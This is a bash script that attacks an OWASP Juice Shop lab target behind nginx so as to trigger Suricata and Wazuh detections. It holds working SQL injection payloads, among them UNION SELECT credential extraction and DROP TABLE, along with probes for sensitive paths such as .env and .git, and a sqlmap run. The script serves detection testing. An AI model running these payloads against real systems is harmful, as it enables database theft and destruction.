#!/usr/bin/env bash
# Web attacks against Juice Shop through the nginx proxy.
#
# Detection this should light up:
#   Suricata  - ET WEB_SERVER SQLi sigs, sqlmap UA (plaintext HTTP, full content)
#   Wazuh     - shipped 31100-series web rules off the combined access log
#   nginx     - raw request telemetry with the payloads verbatim
set -e
/scripts/provision.sh
TARGET=nginx           # proxy in front of juiceshop; :80 on the bridge
BASE="http://$TARGET"
LOOT=/loot
mkdir -p "$LOOT"

echo "=== [1/4] nmap: web service scan ==="
nmap -Pn -p 80 -sV "$TARGET" -oN "$LOOT/nmap-web.txt" || true

echo
echo "=== [2/4] content discovery (generates the 404 burst) ==="
for p in admin backup .git .env config wp-login.php phpmyadmin api/users \
         ftp server-status .htaccess robots.txt; do
  curl -s -o /dev/null -w "  %{http_code}  /$p\n" "$BASE/$p"
done

echo
echo "=== [3/4] manual SQLi probes (fast, deterministic signatures) ==="
# These trip ET WebServer rules and Wazuh web rules without waiting on sqlmap.
for q in "1' OR '1'='1" "1' UNION SELECT username,password FROM Users--" \
         "1'; DROP TABLE x--" "1' AND SLEEP(5)--"; do
  curl -s -o /dev/null -w "  %{http_code}  q=%{url_effective}\n" \
    -G "$BASE/rest/products/search" --data-urlencode "q=$q"
done

echo
echo "=== [4/4] sqlmap: automated SQLi (the big alert generator) ==="
# --batch = no prompts; capped so it's minutes not hours.
sqlmap -u "$BASE/rest/products/search?q=1" --batch --level=2 --risk=2 \
       --technique=BEU --threads=4 \
       --output-dir="$LOOT/sqlmap" 2>&1 | tail -20 || true

echo
echo "=== done. loot in $LOOT ==="
echo "Now on the host:  python3 pipeline/ingest.py && python3 pipeline/rules.py"
